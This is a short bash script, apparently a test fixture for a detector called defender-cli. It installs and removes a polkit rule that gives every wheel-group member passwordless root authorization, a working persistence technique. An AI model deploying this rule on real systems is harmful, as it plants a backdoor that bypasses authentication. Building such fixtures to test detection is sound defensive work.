#!/usr/bin/env bash
# Polkit persistence: a JS rule that grants any user in wheel passwordless root.
# Detected by: defender-cli anti-persistence --polkit
set -euo pipefail
[[ $EUID -eq 0 ]] || { echo "[!] Requires root"; exit 1; }

RULES_DIR="/etc/polkit-1/rules.d"
RULES_FILE="$RULES_DIR/00-defender-test.rules"
TAG="DEFENDER-TEST-polkit"

case "${1:-}" in
  deploy)
    mkdir -p "$RULES_DIR"
    cat > "$RULES_FILE" << 'EOF'
// DEFENDER-TEST-polkit — grants wheel members unrestricted root via polkit
polkit.addRule(function(action, subject) {
    if (subject.isInGroup("wheel")) {
        return polkit.Result.YES;
    }
});
EOF
    echo "[+] 14_polkit_rule: $RULES_FILE installed"
    ;;
  cleanup)
    rm -f "$RULES_FILE"
    echo "[-] 14_polkit_rule: $RULES_FILE removed"
    ;;
  *) echo "Usage: $0 deploy|cleanup"; exit 1 ;;
esac
